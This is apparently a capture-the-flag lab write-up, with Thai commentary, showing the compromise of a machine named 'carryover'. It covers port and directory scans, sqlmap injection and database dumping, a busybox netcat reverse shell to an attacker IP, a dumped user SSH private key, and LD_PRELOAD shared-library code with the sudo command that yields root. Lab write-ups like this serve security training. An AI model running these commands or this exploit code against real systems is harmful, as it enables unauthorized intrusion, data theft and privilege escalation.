# recon 

## TCP Scan 
```bash
sudo ../Tools/scan.sh  192.168.175.114                       
[sudo] password for kali: 
[*] Running rustscan...
[*] Running nmap on ports: 22,80
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-24 20:09 +07
Nmap scan report for 192.168.175.114
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 4b:3e:f3:38:6f:a4:52:9c:27:66:a7:3c:62:30:6b:fa (ECDSA)
|_  256 a7:27:e6:57:86:62:03:c2:b4:65:70:68:45:41:ea:ce (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: CarVilla
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.21 seconds

```

## TCP 80 

![[Challenge/ProvingGround/carryover/IMG/001.png]]

### Dic Bruteforce 

```bash
feroxbuster -u http://192.168.175.114  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt 
                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.175.114
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       11w      153c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       11w      169c http://192.168.175.114/assets => http://192.168.175.114/assets/
200      GET      133l      186w     2836c http://192.168.175.114/assets/js/custom.js
200      GET       41l      204w    17341c http://192.168.175.114/assets/images/clients/c1.png
200      GET       12l       73w     6728c http://192.168.175.114/assets/images/brand/br6.png
200      GET       35l       80w     1014c http://192.168.175.114/assets/css/flaticon.css
200      GET        6l       65w     2887c http://192.168.175.114/assets/css/owl.carousel.min.css
200      GET       95l      249w     2958c http://192.168.175.114/assets/css/responsive.css
200      GET       12l       77w     5255c http://192.168.175.114/assets/images/brand/br3.png
200      GET      536l      897w     8896c http://192.168.175.114/assets/css/linearicons.css
200      GET       21l      128w     7857c http://192.168.175.114/assets/images/brand/br2.png
200      GET       21l       99w     9031c http://192.168.175.114/assets/images/brand/br1.png
200      GET       37l      224w    18191c http://192.168.175.114/assets/images/clients/c2.png
200      GET       18l       96w     7777c http://192.168.175.114/assets/images/brand/br4.png
200      GET        4l       51w     1919c http://192.168.175.114/assets/logo/favicon.png
200      GET     1474l     2993w    35191c http://192.168.175.114/assets/css/bootsnav.css
200      GET      156l      772w    67842c http://192.168.175.114/assets/images/featured-cars/fc5.png
200      GET        7l      432w    37045c http://192.168.175.114/assets/js/bootstrap.min.js
200      GET      598l     1210w    27843c http://192.168.175.114/assets/js/bootsnav.js
200      GET      129l      781w    68757c http://192.168.175.114/assets/images/featured-cars/fc2.png
200      GET      176l      927w    75802c http://192.168.175.114/assets/images/featured-cars/fc4.png
200      GET     2500l     4550w    51840c http://192.168.175.114/assets/css/animate.css
200      GET        7l      285w    42854c http://192.168.175.114/assets/js/owl.carousel.min.js
200      GET       12l       56w     4831c http://192.168.175.114/assets/images/brand/br5.png
200      GET        6l     1401w   118733c http://192.168.175.114/assets/css/bootstrap.min.css
301      GET        7l       11w      169c http://192.168.175.114/assets/js => http://192.168.175.114/assets/js/
301      GET        7l       11w      169c http://192.168.175.114/assets/images => http://192.168.175.114/assets/images/
301      GET        7l       11w      169c http://192.168.175.114/assets/css => http://192.168.175.114/assets/css/
200      GET        4l     1338w    85580c http://192.168.175.114/assets/js/jquery.js
200      GET        6l       41w      936c http://192.168.175.114/assets/css/owl.theme.default.min.css
403      GET        7l        9w      153c http://192.168.175.114/assets/js/
403      GET        7l        9w      153c http://192.168.175.114/assets/images/clients/
403      GET        7l        9w      153c http://192.168.175.114/assets/images/brand/
403      GET        7l        9w      153c http://192.168.175.114/assets/images/new-cars-model/
403      GET        7l        9w      153c http://192.168.175.114/assets/logo/
200      GET      907l     5303w   455002c http://192.168.175.114/assets/images/new-cars-model/ncm3.png
403      GET        7l        9w      153c http://192.168.175.114/assets/images/
200      GET      918l     5640w   445484c http://192.168.175.114/assets/images/new-cars-model/ncm1.png
200      GET      106l      726w    62624c http://192.168.175.114/assets/images/featured-cars/fc3.png
403      GET        7l        9w      153c http://192.168.175.114/assets/images/featured-cars/
200      GET      713l     1455w    18116c http://192.168.175.114/assets/css/style.css
403      GET        7l        9w      153c http://192.168.175.114/assets/css/
200      GET      944l     5523w   457741c http://192.168.175.114/assets/images/new-cars-model/ncm2.png
200      GET      144l      740w    65553c http://192.168.175.114/assets/images/featured-cars/fc8.png
200      GET      167l      898w    64587c http://192.168.175.114/assets/images/featured-cars/fc1.png
200      GET       52l      245w    20176c http://192.168.175.114/assets/images/clients/c3.png
301      GET        7l       11w      169c http://192.168.175.114/assets/fonts => http://192.168.175.114/assets/fonts/
200      GET      165l      912w    80506c http://192.168.175.114/assets/images/featured-cars/fc7.png
200      GET        4l       66w    31000c http://192.168.175.114/assets/css/font-awesome.min.css
200      GET     1626l     2038w    30916c http://192.168.175.114/
301      GET        7l       11w      169c http://192.168.175.114/assets/images/clients => http://192.168.175.114/assets/images/clients/
301      GET        7l       11w      169c http://192.168.175.114/assets/logo => http://192.168.175.114/assets/logo/
301      GET        7l       11w      169c http://192.168.175.114/assets/images/brand => http://192.168.175.114/assets/images/brand/
[####################] - 61s   292471/292471  0s      found:52      errors:0      
[####################] - 59s    26584/26584   448/s   http://192.168.175.114/ 
[####################] - 59s    26584/26584   453/s   http://192.168.175.114/assets/ 
[####################] - 59s    26584/26584   452/s   http://192.168.175.114/assets/images/featured-cars/ 
[####################] - 59s    26584/26584   452/s   http://192.168.175.114/assets/images/ 
[####################] - 59s    26584/26584   454/s   http://192.168.175.114/assets/images/clients/ 
[####################] - 59s    26584/26584   454/s   http://192.168.175.114/assets/js/ 
[####################] - 59s    26584/26584   454/s   http://192.168.175.114/assets/css/ 
[####################] - 59s    26584/26584   454/s   http://192.168.175.114/assets/logo/ 
[####################] - 58s    26584/26584   455/s   http://192.168.175.114/assets/images/brand/ 
[####################] - 58s    26584/26584   454/s   http://192.168.175.114/assets/images/new-cars-model/ 
[####################] - 58s    26584/26584   455/s   http://192.168.175.114/assets/fonts/                  
```

# SQL Injection using sqlmap
หาเราไปดูที่ Brupsuite เราจะเห็นว่ามีช่องที่มีการใช้ POST Method  และอาจทำให้เราสามารถทำ sql injection ได้ 

![[Challenge/ProvingGround/carryover/IMG/002.png]]
```http
POST / HTTP/1.1
Host: carvilla.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://carvilla.com
Connection: keep-alive
Referer: http://carvilla.com/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

year=2017&style=default&make=default&condition=default&model=default&price=default
```

```bash
sqlmap -r a --batch
sqlmap -r a --batch  -dbs
sqlmap -r a --batch  -D car_dealership --tables
sqlmap -r a --batch  -D car_dealership -T cars --dump
```
![[Challenge/ProvingGround/carryover/IMG/003.png]]

# Shell via sqlmap

```bash
sqlmap -r a --os-shell
```

![[Challenge/ProvingGround/carryover/IMG/004.png]]

ใช้ busybox สำหรับทำ reverse shell 

```bash
os-shell> busybox nc 192.168.45.245 443 -e /bin/bash
```

![[Challenge/ProvingGround/carryover/IMG/005.png]]

# Shell as ogbos 

GET ID_RSA from /home/ogbos/.ssh/id_rsa 
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

![[Challenge/ProvingGround/carryover/IMG/006.png]]

![[Challenge/ProvingGround/carryover/IMG/007.png]]

**การที่ `env_keep+=LD_PRELOAD` ถูกเก็บไว้โดย `sudo` ถือเป็นช่องโหว่ด้านความปลอดภัยที่ร้ายแรงมาก** ผู้ใช้ที่มีสิทธิ์รันคำสั่งใด ๆ ด้วย `sudo` และสามารถควบคุมค่าของ `LD_PRELOAD` ได้ ก็อาจจะสามารถยกระดับสิทธิ์ (privilege escalation) ไปเป็น root หรือผู้ใช้อื่น ๆ ได้อย่างง่ายดาย 

โดย `LD_PRELOAD` ใช้เพื่อระบุ **path ไปยังไลบรารีที่แชร์ (shared library - ไฟล์ .so)** ที่ระบบควรโหลด **ก่อน** ไลบรารีที่แชร์อื่น ๆ ทั้งหมด (รวมถึงไลบรารีระบบมาตรฐาน เช่น `libc`) เมื่อโปรแกรมเริ่มทำงาน

ref: https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/ 

# Shell as root 

```bash
---------------------------------------------------
ogbos@carryover:/tmp$ vi shell.c
ogbos@carryover:/tmp$ cat shell.c 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}

---------------------------------------------------
ogbos@carryover:/tmp$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
shell.c: In function ‘_init’:
shell.c:6:1: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
    6 | setgid(0);
      | ^~~~~~
shell.c:7:1: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
    7 | setuid(0);
      | ^~~~~~

---------------------------------------------------
ogbos@carryover:/tmp$ sudo LD_PRELOAD=/tmp/shell.so /usr/bin/python3 /opt/event-viewer.py
sudo: unable to resolve host carryover: Name or service not known
# whoami 
root
# cd /root
# ls 
proof.txt
# cat proof.txt
# 

```

# PWN